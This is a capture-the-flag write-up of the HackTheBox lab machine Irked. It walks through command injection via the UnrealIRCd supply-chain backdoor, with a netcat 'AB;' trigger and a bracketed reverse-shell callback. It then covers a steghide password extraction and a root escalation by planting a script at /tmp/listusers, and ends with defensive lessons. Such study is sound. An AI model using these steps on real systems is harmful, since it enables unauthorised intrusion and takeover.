---
layout: post
title: "The Backdoor Someone Else Left"
subtitle: "HTB Irked, where a chat server poisoned at the source runs your command before you say hello, and a curious binary trusts a file that was never there"
date: 2019-05-04 12:00:00 +0000
description: "A chat server shipped with a stranger's backdoor sewn into its source, and a root binary trusts a script that does not exist yet."
image: /assets/og/the-backdoor-someone-else-left.png
tags: [hackthebox, writeup]
---

Irked is a box about trust you never gave on purpose. The chat server running on it was poisoned at the factory, years before this machine ever booted, by someone who slipped a backdoor into the source code that thousands of people downloaded and trusted. You do not break that server. You knock with a secret handshake a stranger built into it in 2010, and it runs your command before it even asks your name. The rest of the box is two more echoes of the same theme. A password hidden inside a photo for anyone who knows the magic word, and a program owned by root that reaches for a file in a place anyone can write, and trusts whatever it finds there. Nothing here is forced. Every door was propped open by misplaced trust, and you just walk through them in order.

```
        I R K E D
        =========
        :ircd    "what's your nick?"
        you      "AB; [a command]"
        ircd     runs it. doesn't wait for the nick.
                     |
                     v
        a photo on the website hides a word.
        the word unlocks a password inside it.
                     |
                     v
        a root program asks /tmp for a script.
        the script isn't there. so you write it.
                                            琴
```

## 0x01 · the lobby

`nmap` comes back with a couple of normal ports and then a few that make you tilt your head.

```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 6.7p1 Debian
80/tcp    open  http     Apache httpd 2.4.10 ((Debian))
111/tcp   open  rpcbind
6697/tcp  open  irc      UnrealIRCd
8067/tcp  open  irc      UnrealIRCd
65534/tcp open  irc      UnrealIRCd
```

The website is a single image and a note that the site is a work in progress. That is bait for later, so file it. The interesting part is the bottom three lines. The same IRC daemon, `UnrealIRCd`, answering on three ports including one parked way up at 65534, the very top of the range, like someone tried to hide it in the attic. IRC is ancient internet chat, the kind of thing that ran message boards before message boards. A chat server is rarely the front door of a modern box, which is exactly why it is worth a long look here.

Pin down the version and the whole box opens. Connecting with an IRC client and reading the server banner, or letting nmap's scripts do the talking, gives you `Unreal3.2.8.1`. That string is not just a version. It is a crime scene.

## 0x02 · the handshake a stranger built

UnrealIRCd 3.2.8.1 is famous for one reason, and it has nothing to do with a coding mistake. For roughly seven months between late 2009 and June 2010, the official download archive of UnrealIRCd was swapped for a tampered copy. Someone broke into the distribution and sewed a backdoor directly into the source code, so that everyone who downloaded, compiled, and ran it was building an unlocked back entrance into their own server without knowing it. That is CVE-2010-2075, and it is one of the cleaner supply-chain attacks on record.

Here is the mechanic in plain terms. The backdoor watches the incoming chat traffic for a line that begins with the two letters `AB`. When it sees that prefix, instead of treating the rest as a chat message, it strips the `AB` off and hands everything after it straight to the system shell to run, as the user the server runs as. No login. No password. The poisoned server does not care who you are.

Think of it like a vending machine that a crooked technician rigged at the warehouse before it ever shipped. To everyone else it sells snacks. But if you press a secret sequence of buttons only the technician knew, the front panel swings open and you can take whatever you want. The owner bought a normal vending machine. They have no idea the warehouse left a code in it.

You can knock by hand with `netcat`. Send the magic prefix, then a command.

```
$ nc 10.10.10.117 6697
AB; ping -c 1 10.10.14.4
```

Watch your own machine with `tcpdump` and the ping lands, which proves the server ran your command. Now trade the ping for a real callback. The literal payload stays in brackets here on purpose.

```
AB; [ bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ]
```

A common snag is that the rawest version of the reverse shell does not survive the trip, so the reliable move is to base64-encode the shell command and have the server decode and run it, which dodges the characters that get mangled on the way in. Start a listener, send the line, and a prompt drops into your lap.

```
$ nc -lvnp 443
connect to [10.10.14.4] from 10.10.10.117
$ id
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
```

You are `ircd`, a low-privilege service account. Not a person, not root, just the identity the chat server wears. But you are inside.

## 0x03 · the word inside the photo

`ircd` cannot read the user flag, so you go looking for a way to become a real user. Poke around home directories and `djmardov` has a Documents folder with a hidden file, `.backup`.

```
$ cat /home/djmardov/Documents/.backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

Read that twice. It tells you two things at once. First, the password `UPupDOWNdownLRlrBAbaSSss`, which is the Konami code spelled out, a nice wink. Second, and more useful, the words "steg backup." Steg is short for steganography, the practice of hiding one file inside another, usually a picture. So somewhere there is an image with a secret stuffed into it, and now you hold the key.

Picture a postcard of a beach. To anyone glancing at it, it is just a beach. But if you hold it up to exactly the right light, words appear in the sand that nobody else can see. Steganography is that trick done with math. The secret data is woven into the tiny color values of the pixels, invisible to the eye, recoverable only if you know the password that locks it.

Remember the website was a single image. Pull `irked.jpg` down from the web server and feed it to `steghide` with the password you just found.

```
$ wget http://10.10.10.117/irked.jpg
$ steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
wrote extracted data to "pass.txt".
$ cat pass.txt
Kab6h+m+bbp2J:HG
```

The beach gave up its hidden words. That `pass.txt` is `djmardov`'s actual password, and SSH is open, so you stop wearing the service account and log in as a real person.

```
$ ssh djmardov@10.10.10.117
djmardov@irked:~$ cat ~/user.txt
████████████████████████████████
```

## 0x04 · the file that wasn't there

Now you need root. The fast way to find a privilege-escalation hole on Linux is to ask which programs are allowed to run as their owner instead of as you. That is the SUID bit, a special flag that says "run this with the file owner's power, not the caller's." List the SUID-root programs and one of them does not belong.

```
$ find / -perm -4000 -user root 2>/dev/null
...
/usr/bin/viewuser
```

`viewuser` is not a standard tool. It is custom, it is owned by root, and it has the SUID bit, which means when you run it, it runs as root. Run it and watch what it does.

```
$ viewuser
This application is being developed to set and test user permissions
It is still being actively developed
(unknown) :0   ...
sh: 1: /tmp/listusers: not found
```

There is the whole game in one error line. The program tries to run `/tmp/listusers` and complains that the file is not there. Internally it is calling out to the shell to execute that path, with root's authority, and it never checks whether the file is one it actually trusts. It just reaches into `/tmp`, a directory the whole world can write to, grabs whatever sits at that name, and runs it as root.

Think of it like a manager who tells the new hire "every morning, go to the public mailbox on the corner, take out the note inside, and do exactly what it says." The manager assumes only head office leaves notes there. But the mailbox is on a public street. Anyone walking by can drop a note in. Whatever the note says gets done with the manager's full authority, and the manager never checks the handwriting.

So you write the note. The file does not exist yet, which means you are not even overwriting anything. You simply create `/tmp/listusers`, put a command to launch a shell inside it, mark it runnable, and trigger the manager.

```
djmardov@irked:~$ echo '/bin/sh' > /tmp/listusers
djmardov@irked:~$ chmod +x /tmp/listusers
djmardov@irked:~$ viewuser
...
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
████████████████████████████████
```

The program reached for its note, found yours, and ran it as root. Done.

## 0x05 · the honest caveat

Irked is rated easy, and the steps are short, but the lessons under them are not small. The UnrealIRCd backdoor is the one that should keep you up at night, because there was no bug to find. The code did exactly what it was written to do. The problem was that the code itself had been tampered with, upstream, before it ever reached the people who ran it. Every defensive habit we teach assumes the software you installed is the software the author wrote. Supply-chain attacks break that assumption at the root, and they have only gotten more common since 2010. You cannot audit your way out of a poisoned download if you never check that the download is genuine. This is exactly why signatures and checksums exist, and exactly why so few people bother to verify them.

The `viewuser` step is the everyday version of the same disease. A program ran as root and trusted an input it did not control, in this case a file path sitting in a world-writable directory. The fix is boring and total. A privileged program must never reach for a resource that an unprivileged user can replace, and it must use absolute, locked-down paths it fully owns. The moment a root process trusts something from `/tmp`, or from your `PATH`, or from a filename a stranger can influence, it has handed its crown to whoever gets there first. The backdoor was a trust you never knew you extended. The binary was a trust extended to the wrong drawer. Same mistake, two costumes.

## 0x06 · outro

```
the chat server ran your command before it learned your name,
because someone you never met left a key under its mat in 2010.

the photo gave up a password to anyone who knew the word.
the root program asked an open mailbox for orders, and you mailed it some.

three doors, none of them forced. each one trusted the wrong stranger.

verify the source. mind the writable path. wear black.

                                                            EOF
```

---

*HTB: Irked, retired 06 Apr 2019. An easy Linux box that is really a lecture on misplaced trust, from a supply-chain backdoor sewn into a chat server to a root binary that reads its orders out of a public drawer. The handshake still works in a lab and nowhere you don't own.*